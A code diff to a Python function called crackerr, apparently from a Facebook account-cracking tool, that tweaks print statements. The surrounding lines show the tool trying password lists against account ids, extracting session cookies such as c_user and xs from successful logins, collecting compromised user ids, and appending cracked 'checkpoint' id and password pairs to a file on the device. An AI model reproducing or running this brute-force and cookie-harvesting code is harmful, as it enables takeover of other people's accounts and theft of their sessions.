@@ -519,7 +519,7 @@ def crackerr(ids,passlist):
             if "c_user" in log_cookies:
                 #kuki = convert(session.cookies.get_dict())
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
-                print(kuki)
+                print("good")
                 user = re.findall('c_user=(.*);xs', kuki)[0]
                 bkas.append(user)
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
@@ -548,7 +548,7 @@ def crackerr(ids,passlist):
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
+                print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
                 open('/sdcard/ATOM-CP.txt', 'a').write( ids+' | '+pas+'\n')
                 cps.append(ids)
                 break
@@ -557,7 +557,7 @@ def crackerr(ids,passlist):
     except requests.exceptions.ConnectionError:
         time.sleep(20)
     except Exception as e:
-        print(f"\nError: {e}")
+        #print(f"\nError: {e}")
         pass
 
 
